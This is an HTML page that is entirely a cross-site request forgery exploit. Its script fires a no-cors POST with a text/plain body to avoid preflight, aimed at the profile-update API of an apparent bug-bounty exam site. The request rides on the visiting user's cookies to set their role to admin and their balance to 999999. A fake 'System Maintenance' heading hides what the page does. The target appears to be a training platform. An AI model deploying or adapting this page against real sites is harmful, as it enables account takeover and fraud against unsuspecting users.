<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Target URL (Adjust this if the API path is different)
        const targetUrl = "https://bugbounty-exam.hashacademy.co/api/v1/profile/update";

        // 2. The Data: We are telling the server to update the user to Admin
        const exploitData = JSON.stringify({
            "fullName": "Saja Pwned",
            "role": "admin",
            "balance": 999999
        });

        // 3. Execution: Using fetch with 'no-cors' to fire the request
        // Even if it 'fails' due to CORS, the request still HITS the server 
        // and executes with the Admin's cookies!
        fetch(targetUrl, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'text/plain' // Using text/plain to avoid preflight
            },
            body: exploitData
        });

        console.log("Exploit launched. Check your dashboard.");
    </script>
    <h1>System Maintenance in Progress...</h1>
</body>
</html>
